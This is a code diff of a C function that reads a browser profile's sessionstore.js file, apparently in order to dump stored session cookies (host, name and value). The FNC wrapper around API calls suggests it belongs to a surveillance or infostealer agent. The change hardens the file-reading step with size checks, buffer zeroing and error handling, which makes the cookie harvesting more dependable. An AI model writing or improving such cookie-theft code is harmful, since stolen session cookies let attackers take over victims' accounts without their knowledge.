@@ -105,19 +105,28 @@ int DumpSessionCookies(WCHAR *profilePath)
 	JSONObject root;
 	WCHAR sessionPath[MAX_PATH];
 	WCHAR *host = NULL, *name = NULL, *cvalue = NULL;
-	DWORD n_read;
+	DWORD n_read = 0;
 
 	swprintf_s(sessionPath, MAX_PATH, L"%s\\sessionstore.js", profilePath);
 	h_session_file = FNC(CreateFileW)(sessionPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (h_session_file == INVALID_HANDLE_VALUE)
 		return 0;
 	session_size = GetFileSize(h_session_file, NULL);
-	session_memory = (char *)malloc(session_size);
+	if (session_size == INVALID_FILE_SIZE || session_size == 0) {
+		CloseHandle(h_session_file);
+		return 0;
+	}
+	session_memory = (char *)malloc(session_size + sizeof(WCHAR));
 	if (!session_memory) {
 		CloseHandle(h_session_file);
 		return 0;
 	}
-	ReadFile(h_session_file, session_memory, session_size, &n_read, NULL);
+	memset(session_memory, 0, session_size + sizeof(WCHAR));
+	if (!ReadFile(h_session_file, session_memory, session_size, &n_read, NULL)) {
+		CloseHandle(h_session_file);
+		SAFE_FREE(session_memory);
+		return 0;
+	}
 	CloseHandle(h_session_file);
 	if (n_read != session_size) {
 		SAFE_FREE(session_memory);
